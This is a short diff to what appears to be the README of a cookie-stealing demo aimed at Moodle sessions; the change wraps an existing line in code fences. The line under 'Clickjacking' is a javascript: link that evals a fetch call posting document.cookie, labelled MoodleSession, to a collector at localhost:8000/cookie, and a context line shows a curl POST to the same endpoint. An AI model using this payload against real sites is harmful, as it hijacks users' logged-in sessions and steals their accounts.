@@ -46,7 +46,9 @@ curl -X POST http://localhost:8000/cookie -H "Content-Type: application/json" -d
 ```
 
 ## Clickjacking
+```
 <a href="javascript:eval('fetch(\'http://localhost:8000/cookie\', { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: JSON.stringify({ MoodleSession: document.cookie}) });')">Click aquí</a>
+```
 
 ## Autor
 
